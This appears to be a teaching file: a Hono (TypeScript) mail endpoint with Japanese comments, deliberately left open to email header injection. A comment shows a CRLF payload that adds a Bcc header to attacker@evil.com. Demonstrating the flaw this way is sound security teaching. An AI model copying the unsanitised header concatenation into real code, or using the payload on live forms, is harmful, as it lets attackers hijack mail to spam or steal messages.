import { Hono } from "hono";

const app = new Hono();

// --- 脆弱バージョン ---

// ⚠️ メールヘッダーインジェクション: ユーザー入力をそのままヘッダーに結合
// CRLFが含まれると任意のヘッダーを追加できる
app.post("/send", async (c) => {
  const body = await c.req.json<{
    from: string;
    subject: string;
    body: string;
  }>();
  const { from, subject, body: mailBody } = body;

  if (!from || !subject || !mailBody) {
    return c.json(
      {
        success: false,
        message: "送信元、件名、本文をすべて入力してください",
      },
      400
    );
  }

  // ⚠️ ユーザー入力をサニタイズせずにメールヘッダーに直接結合
  // subject に "お問い合わせ\r\nBcc: attacker@evil.com" が入力されると:
  // Subject ヘッダーが終了し、Bcc ヘッダーが新たに追加される
  const headers = [
    `From: ${from}`,
    `To: support@example.com`,
    `Subject: ${subject}`,
    `Content-Type: text/plain; charset=UTF-8`,
  ].join("\r\n");

  const message = `${headers}\r\n\r\n${mailBody}`;

  // メール送信をシミュレーション（実際には送信しない）
  console.log("[VULNERABLE] 生成されたメール:\n", message);

  return c.json({
    success: true,
    message: "メールを送信しました（脆弱版）",
    generatedHeaders: headers,
    _debug: {
      fullMessage: message,
      warning:
        "CRLFが含まれている場合、追加のヘッダーが注入されている可能性があります",
    },
  });
});

export default app;
